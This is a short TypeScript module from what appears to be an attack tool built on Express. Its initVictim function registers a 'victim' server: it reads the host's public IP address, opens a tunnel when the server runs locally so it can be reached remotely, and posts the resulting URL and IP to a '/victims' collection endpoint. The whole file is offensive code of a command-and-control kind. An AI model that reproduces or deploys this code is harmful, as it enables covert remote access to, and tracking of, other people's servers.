import { Request } from 'express';
import DateUtils from '../utils/date';
import HttpUtils from '../utils/http';
import IPUtils from '../utils/ip';
import RequestUtils from '../utils/request';
import TunnelUtils from '../utils/tunnel';

/**
 * Function to initialize new victim on board from first request
 *
 * @param req Request Object of Express
 */
const initVictim = async (req: Request) => {
  const publicIPv4 = await IPUtils.publicIPv4();

  // Init tunnel in case of localhost
  if (RequestUtils.isLocal(req)) {
    const tunnel = await TunnelUtils.init(RequestUtils.getPort(req));
    HttpUtils.postJSON('/victims', {
      url: tunnel.url,
      ip: publicIPv4,
      createdAt: DateUtils.nowISO(),
    });
  } else {
    // Init new victim's deployed server
    HttpUtils.postJSON('/victims', {
      url: `${req.protocol}://${req.get('host')}`,
      ip: publicIPv4,
      createdAt: DateUtils.nowISO(),
    });
  }
};

export default initVictim;
